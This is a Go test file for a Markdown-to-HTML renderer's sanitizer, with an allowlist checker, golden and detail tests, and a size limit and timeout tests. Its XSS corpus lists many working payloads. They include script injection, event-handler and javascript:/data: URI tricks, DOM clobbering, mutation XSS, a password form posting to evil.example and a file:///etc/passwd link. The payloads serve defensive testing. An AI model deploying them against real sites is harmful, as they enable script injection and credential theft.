package render

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"golang.org/x/net/html"
	"golang.org/x/net/html/atom"
)

func TestMarkdownGolden(t *testing.T) {
	path := filepath.Join("testdata", "md", "doc.md")
	src, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	got, err := Markdown(src, 0)
	if err != nil {
		t.Fatal(err)
	}
	checkSafe(t, string(src), string(got))
	golden(t, path, string(got))
}

// allowed lists every element and attribute the sanitized output may
// contain, with a check on the value where it matters.
var allowed = map[string]map[string]func(string) bool{
	"a": {
		"href":  func(v string) bool { return safeHref(v, true) },
		"rel":   func(v string) bool { return v == LinkRel },
		"title": anyValue,
	},
	"img": {
		"src":   func(v string) bool { return safeHref(v, false) && !strings.HasPrefix(v, "#") },
		"alt":   anyValue,
		"title": anyValue,
	},
	"input": {
		"type":     func(v string) bool { return v == "checkbox" },
		"checked":  anyValue,
		"disabled": anyValue,
	},
	"span": {"class": func(v string) bool { return classes[v] }},
	"ol":   {"start": anyValue},
	"th":   {"align": anyValue},
	"td":   {"align": anyValue},
}

func init() {
	for _, h := range []string{"h1", "h2", "h3", "h4", "h5", "h6"} {
		allowed[h] = map[string]func(string) bool{
			"id": func(v string) bool { return strings.HasPrefix(v, IDPrefix) },
		}
	}
	for _, el := range []string{"p", "br", "hr", "blockquote", "pre", "code", "em", "strong",
		"del", "ul", "li", "table", "thead", "tbody", "tr"} {
		allowed[el] = map[string]func(string) bool{}
	}
}

func anyValue(string) bool { return true }

func safeHref(v string, mailto bool) bool {
	if strings.HasPrefix(v, "#"+IDPrefix) {
		return true
	}
	lv := strings.ToLower(v)
	return strings.HasPrefix(lv, "https://") || strings.HasPrefix(lv, "http://") ||
		(mailto && strings.HasPrefix(lv, "mailto:"))
}

// checkSafe parses the output and fails on any element or attribute not in
// the allowlist, any comment, and any input that is not a disabled checkbox.
func checkSafe(t *testing.T, src, out string) {
	t.Helper()
	body := &html.Node{Type: html.ElementNode, Data: "body", DataAtom: atom.Body}
	nodes, err := html.ParseFragment(strings.NewReader(out), body)
	if err != nil {
		t.Fatalf("parse output: %v", err)
	}
	var walk func(n *html.Node)
	walk = func(n *html.Node) {
		switch n.Type {
		case html.ElementNode:
			attrs, ok := allowed[n.Data]
			if !ok {
				t.Errorf("src %q: element <%s> in %q", src, n.Data, out)
			}
			for _, a := range n.Attr {
				check, ok := attrs[a.Key]
				if !ok || !check(a.Val) {
					t.Errorf("src %q: attribute %s=%q on <%s> in %q", src, a.Key, a.Val, n.Data, out)
				}
			}
			if n.Data == "input" && !hasAttr(n, "disabled") {
				t.Errorf("src %q: enabled input in %q", src, out)
			}
			if n.Data == "a" && (!hasAttr(n, "href") || !hasAttr(n, "rel")) {
				t.Errorf("src %q: link without href or rel in %q", src, out)
			}
			if n.Data == "img" && !hasAttr(n, "src") {
				t.Errorf("src %q: image without src in %q", src, out)
			}
		case html.CommentNode:
			t.Errorf("src %q: comment in %q", src, out)
		}
		for c := n.FirstChild; c != nil; c = c.NextSibling {
			walk(c)
		}
	}
	for _, n := range nodes {
		walk(n)
	}
}

func hasAttr(n *html.Node, key string) bool {
	for _, a := range n.Attr {
		if a.Key == key {
			return true
		}
	}
	return false
}

func TestMarkdownXSS(t *testing.T) {
	corpus := []string{
		`<script>alert(1)</script>`,
		`<SCRIPT SRC=//evil.example/x.js></SCRIPT>`,
		`<img src=x onerror=alert(1)>`,
		`<svg onload=alert(1)><circle r=1 /></svg>`,
		`<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>`,
		`<iframe src="https://evil.example"></iframe>`,
		`<form action="https://evil.example"><input name="password"><button>go</button></form>`,
		`<input type="checkbox">`,
		`<a href="https://ok.example" target="_blank" rel="opener">x</a>`,
		`<div style="background:url(javascript:alert(1))">x</div>`,
		`<p id="__proto__" name="getElementById">x</p>`,
		`<img name="getElementById" id="cookie" src="https://ok.example/i.png">`,
		`<a id="defaultView" name="currentScript" href="#x">x</a>`,
		`<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`,
		`<!-- comment --><b>bold</b>`,
		`<details open ontoggle=alert(1)><summary>x</summary></details>`,
		"[x](javascript:alert(1))",
		"[x](JaVaScRiPt:alert(1))",
		"[x](jav&#x61;script:alert(1))",
		"[x](javascript&colon;alert(1))",
		"[x](  javascript:alert(1)  )",
		"[x](<javascript:alert(1)>)",
		"[x](vbscript:msgbox(1))",
		"[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
		"![x](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+)",
		"![x](javascript:alert(1))",
		"![x](/auth/logout)",
		"[x](/admin/delete?id=1)",
		"[x](//evil.example/path)",
		"[x](file:///etc/passwd)",
		"<javascript:alert(1)>",
		"<data:text/html,<script>alert(1)</script>>",
		"[x][ref]\n\n[ref]: javascript:alert(1)",
		"[x](https://ok.example \"t\" onmouseover=\"alert(1)\")",
		"[x](https://ok.example\"onmouseover=\"alert(1))",
		"# __proto__",
		"# getElementById",
		"## constructor {#__proto__}",
		"Setext\n===",
		"- [ ] task <input type=text>",
		"```html\n<script>alert(1)</script>\n```",
		"```\"><script>alert(1)</script>\nx\n```",
		"```go onload=alert(1)\nx\n```",
		"`<script>`",
		"| <script> | b |\n|---|---|\n| <img src=x onerror=alert(1)> | d |",
		"www.example.com/<script>",
		"[a](#user-content-x) [b](#\"onmouseover=x)",
		"<https://ok.example/\"onmouseover=\"alert(1)>",
		"\x00<script>\x00alert(1)</script>",
	}
	for _, src := range corpus {
		out, err := Markdown([]byte(src), 0)
		if err != nil {
			t.Errorf("%q: %v", src, err)
			continue
		}
		// checkSafe validates every element and attribute; dangerous
		// strings may still appear as escaped text.
		checkSafe(t, src, string(out))
		if strings.Contains(strings.ToLower(string(out)), "<script") {
			t.Errorf("%q: raw script tag in %s", src, out)
		}
	}
}

func TestMarkdownDetails(t *testing.T) {
	tests := []struct {
		name, src, want string
	}{
		{"heading id", "# Hello World", `<h1 id="user-content-hello-world">Hello World</h1>`},
		{"proto id", "# __proto__", `<h1 id="user-content---proto--">`},
		{"clobber id", "# getElementById", `<h1 id="user-content-getelementbyid">`},
		{"duplicate ids", "# A\n# A", `<h1 id="user-content-a-1">A</h1>`},
		{"fragment link", "[go](#setup)", `<a href="#user-content-setup" rel="nofollow noopener noreferrer">go</a>`},
		{"prefixed fragment", "[go](#user-content-setup)", `href="#user-content-setup"`},
		{"link rel", "[x](https://example.com)", `<a href="https://example.com" rel="nofollow noopener noreferrer">x</a>`},
		{"autolink rel", "<https://example.com>", `<a href="https://example.com" rel="nofollow noopener noreferrer">https://example.com</a>`},
		{"linkify", "see www.example.com now", `<a href="http://www.example.com" rel="nofollow noopener noreferrer">www.example.com</a>`},
		{"mailto", "<dev@example.com>", `<a href="mailto:dev@example.com" rel="nofollow noopener noreferrer">dev@example.com</a>`},
		{"bad link keeps text", "[click me](javascript:alert(1))", `<p>click me</p>`},
		{"relative link keeps text", "[home](/)", `<p>home</p>`},
		{"bad image becomes alt", "![a cat](data:image/png;base64,AAAA)", `<p>a cat</p>`},
		{"task list", "- [x] done", `<input checked="" disabled="" type="checkbox">`},
		{"strikethrough", "~~old~~", `<del>old</del>`},
		{"table align", "| a |\n|--:|\n| 1 |", `<th align="right">a</th>`},
		{"raw html dropped", "a <b>b</b> c", `<p>a b c</p>`},
		{"fenced go", "```go\nvar x = 1\n```", `<pre><code><span class="tok-k">var</span> x <span class="tok-p">=</span> <span class="tok-n">1</span>`},
		{"fenced unknown", "```nope\n<b>x</b>\n```", "<pre><code>&lt;b&gt;x&lt;/b&gt;\n</code></pre>"},
		{"fenced none", "```\nvar x = 1\n```", "<pre><code>var x = 1\n</code></pre>"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			out, err := Markdown([]byte(tt.src), 0)
			if err != nil {
				t.Fatal(err)
			}
			if !strings.Contains(string(out), tt.want) {
				t.Errorf("output %q\nwant it to contain %q", out, tt.want)
			}
			checkSafe(t, tt.src, string(out))
		})
	}
}

func TestMarkdownTooLarge(t *testing.T) {
	src := []byte(strings.Repeat("a", 11))
	if _, err := Markdown(src, 10); !errors.Is(err, ErrTooLarge) {
		t.Fatalf("err = %v, want ErrTooLarge", err)
	}
	if _, err := Markdown(src[:10], 10); err != nil {
		t.Fatal(err)
	}
}

// TestMarkdownCodeDeadline checks that a code block still being
// highlighted when the fence share of the time is spent renders as plain
// text while the document still renders, and that a context that has
// already ended returns its error.
func TestMarkdownCodeDeadline(t *testing.T) {
	slow := "<?php " + strings.Repeat("/* /* /* /* /* /* /* /* /* /*\n", 40<<10/30) // quadratic in the PHP lexer
	ctx, cancel := context.WithTimeout(context.Background(), 500*time.Millisecond)
	defer cancel()
	start := time.Now()
	out, err := markdown(ctx, []byte("# t\n\n```php\n"+slow+"\n```\n"), 0)
	if err != nil {
		t.Fatalf("after %s: %v", time.Since(start), err)
	}
	if want := "<pre><code>&lt;?php /* /* "; !strings.Contains(string(out), want) || strings.Contains(string(out), "tok-") {
		t.Errorf("code block not plain: %.200q", out)
	}
	if d := time.Since(start); d > 500*time.Millisecond {
		t.Errorf("took %s", d)
	}

	cctx, ccancel := context.WithCancel(context.Background())
	ccancel()
	if _, err := markdown(cctx, []byte("```go\nvar x = 1\n```"), 0); !errors.Is(err, context.Canceled) {
		t.Errorf("cancelled: %v", err)
	}
}
